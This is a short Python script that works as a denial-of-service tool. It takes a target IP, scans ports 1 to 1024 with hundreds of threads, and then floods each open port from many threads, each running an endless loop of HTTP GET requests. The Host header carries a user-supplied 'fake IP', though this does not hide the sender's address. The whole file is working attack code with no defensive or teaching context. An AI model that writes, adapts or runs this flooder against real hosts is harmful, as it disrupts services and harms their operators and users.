import socket
from concurrent.futures import ThreadPoolExecutor
import threading

target_ip = input("Enter target IP (in x.y.z.a format): ")
open_ports = []
ports_to_scan = range(1, 1025)
fake_ip = input("Enter fake IP (in x.y.z.a format): ")
Trd = int(input("Insert number of Threads for each DOS: "))

def port_scan(target_port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(1) #set it on whatever you want to
    try:
        sock.connect((target_ip, target_port))
        open_ports.append(target_port)
    except socket.error:
        pass
    finally:
        sock.close()

def attack(port):
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, port))
        s.sendto(("GET /" + target_ip + " HTTP/1.1\r\n").encode('ascii'), (target_ip, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target_ip, port))
        print("Request sent to " + target_ip + " to port " + str(port) + "\n")
        s.close()

def thread_attack(ports):
    for i in range(Trd):
        thread = threading.Thread(target=attack, args=(ports,))
        thread.start()

def main():
    threads = []
    with ThreadPoolExecutor(max_workers= 500) as executor: #set it to whatever you want
        executor.map(port_scan, ports_to_scan)

    if open_ports:
        print(f"Open ports: {open_ports} on {target_ip}")
        print("Launching DOS attack on the open ports")
        with ThreadPoolExecutor(max_workers= len(open_ports)) as executor:
            executor.map(thread_attack, open_ports)
    else: print(f"No open ports found on {target_ip}")

if __name__ == "__main__":
    main()